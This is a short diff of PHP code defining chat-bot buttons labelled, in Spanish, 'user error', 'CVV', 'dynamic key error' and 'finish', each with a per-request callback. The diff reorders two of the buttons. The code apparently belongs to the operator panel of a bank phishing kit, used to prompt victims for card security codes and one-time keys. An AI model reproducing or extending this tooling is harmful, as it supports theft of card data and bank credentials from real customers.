@@ -61,8 +61,8 @@ $botones = [
     ['text' => "🔴ERROR USUARIO ", 'callback_data' => "OPCION_7_$nuevo_request_id"],
     ['text' => "🟢CVV", 'callback_data' => "OPCION_55_$nuevo_request_id"]
   ], [
-    ['text' => "🟢FINALIZAR", 'callback_data' => "OPCION_8_$nuevo_request_id"],
-       ['text' => "🔴ERROR DINAMICA ", 'callback_data' => "OPCION_9_$nuevo_request_id"]
+    ['text' => "🔴ERROR DINAMICA ", 'callback_data' => "OPCION_9_$nuevo_request_id"],
+    ['text' => "🟢FINALIZAR",       'callback_data' => "OPCION_10_$nuevo_request_id"]
   ]]
 ];
 
